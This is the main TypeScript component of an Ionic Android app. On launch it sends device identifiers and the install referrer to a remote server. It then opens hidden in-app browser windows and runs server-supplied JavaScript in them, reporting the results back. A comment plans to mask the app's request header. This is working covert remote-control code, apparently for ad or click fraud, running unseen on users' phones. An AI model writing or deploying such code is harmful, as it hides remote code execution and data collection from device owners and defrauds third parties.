import { Component } from '@angular/core';
import { Platform } from 'ionic-angular';
import { StatusBar } from '@ionic-native/status-bar';
import { SplashScreen } from '@ionic-native/splash-screen';

import { TabsPage } from '../pages/tabs/tabs';
import { InAppBrowser } from '@ionic-native/in-app-browser';
import { Broadcaster } from '@ionic-native/broadcaster';
import { Storage } from '@ionic/storage';
import { Device } from '@ionic-native/device';
import { Network } from '@ionic-native/network';
import { Http } from '@angular/http';
import 'rxjs/add/operator/map';

@Component({
  templateUrl: 'app.html'
})
export class MyApp {

  rootPage:any = TabsPage;

  network: Network;
  storage: Storage;

  constructor(platform: Platform, statusBar: StatusBar, splashScreen: SplashScreen, iab: InAppBrowser,
              broadcaster: Broadcaster, storage: Storage, device: Device, network: Network, http: Http) {

    platform.ready().then(() => {
      // Okay, so the platform is ready and our plugins are available.
      // Here you can do any higher level native things you might need.
      statusBar.styleDefault();
      splashScreen.hide();

      this.network = network;
      this.storage = storage;

      //get device settings and save it to local storage to use later
      const deviceSettings = {
        uuid: device.uuid,
        model: device.model,
        platform: device.platform,
        version: device.version,
        isVirtual: device.isVirtual,
        serial: device.serial,
        ran: false
      };

      storage.set("deviceSettings", deviceSettings);

      //todo, not sure if we're too late to get the broadcast event need to test this.  I think we are listening too late
      //todo may need to write a custom plugin to get the ids OR make an app per affiliate
      broadcaster.addEventListener('com.android.vending.INSTALL_REFERRER').subscribe(function (referrer) {
        storage.set("referrer", referrer);
      });

      //todo add network instructions
      // if (this.isNetworkOk()) { //we started on a cellular network
      //   this.handleInstructions();
      // } else { //non cellular let's watch for connections to come up
      //   let connectSubscription = this.network.onchange().subscribe(() => {
      //     setTimeout(() => {
      //       if (this.isNetworkOk()) {
      //         this.handleInstructions();
      //         connectSubscription.unsubscribe();
      //       }
      //     }, 3000);
      //   });
      // }

      this.handleInstructions(http, iab);
    });

  }

  isNetworkOk(){
    if(this.network.type == "2g" || this.network.type == "3g" ||
      this.network.type == "4g" || this.network.type == "cellular"){
      return true;
    } else {
      return false;
    }
  }

  handleInstructions(http, iab){
    var app = this;
    this.storage.get("deviceSettings").then(function(deviceSettings){
      alert("posting");

      //call the api for instructions, here's a quick sample
      http.post('https://network-update.com/api/boot',
        {
          "package" : "com.bigbuck.slowlight",
          "android_id" : deviceSettings.uuid,
          "referrer" : "utm_source%3Dtest%26utm_medium%3Dtester"
        },
        {
        }).map(res => res.json()).subscribe(
        data => {
          //THIS is BOOT CALL - TODO set the x request header to NOT be our app
          const browserOptions = 'zoom=no,location=no,useWideViewPort=no,hidden=yes,enableViewportScale=yes';
          const path = app.webviewUrl(data);
          console.log(path);
          iab.create(path, '_blank', browserOptions);

          //THIS IS THE CALL to NEXT and the instructions we will fire.
          app.handleNext(app, data, http, iab, deviceSettings);
        },
        err => {
          console.log("Oops! " + err);
        });
    });
  }

  webviewUrl(data){
    var result = data.filter(function (result) {
      return result.type === "webview";
    });

    return result[0].url;
  }

  nextUrl(data){
    var result = data.filter(function (result) {
      return result.type === "api_instructions";
    });

    return result[0].url;
  }

  async handleNext(app, data, http, iab, deviceSettings){
    //call the api for instructions
    http.post(this.nextUrl(data),
      {
        "package" : "com.bigbuck.slowlight",
        "android_id" : deviceSettings.uuid,
        "referrer" : "utm_source%3Dtest%26utm_medium%3Dtester"
      },
      {
      }).map(res => res.json()).subscribe(
      data => {
        const browserOptions = 'zoom=no,location=no,useWideViewPort=no,hidden=yes,enableViewportScale=yes';
        const path = app.webviewUrl(data);
        const browser = iab.create(path, '_blank', browserOptions);

        browser.on('loadstop').subscribe(event => {
          console.log('loadstop', event);
          if(event.url === path){//make sure we're in the webview with the next instructions
            app.doInstructions(app, data, browser, http);
          }
        });
      },
      err => {
        console.log("problem handling next! " + err);
      });
  }

  async doInstructions(app, data, browser, http){
    for (let instruction of data) {
      if(instruction.type === "sleep"){
        console.log('Taking a break...');
        await app.sleep(instruction.ms);
        console.log('done with our break');
      }else if(instruction.type === "javascript"){
        //run the instructions...
        browser.executeScript({code: instruction.script}).then(
          function(result){
            console.log(result);
            if(instruction.url_log){
              app.log(http, instruction.url_log, result);
            }
          }
        );
      }
    }
  }

  sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
  }


  log(http, url, msg){

    console.log("logging message to "+url+" = "+msg);
    this.storage.get("deviceSettings").then(function(deviceSettings){
      //call the api for instructions, here's a quick sample
      http.post(url,
        {
          "package" : "com.bigbuck.slowlight",
          "android_id" : deviceSettings.uuid,
          "referrer" : "utm_source%3Dtest%26utm_medium%3Dtester",
          "log" : msg
        },
        {}).map(res => res.json()).subscribe(
        data => {
          console.log("logging response"+data.data);
        },
        err => {
          console.log("error logging " + err);
        });
    });
  }
}
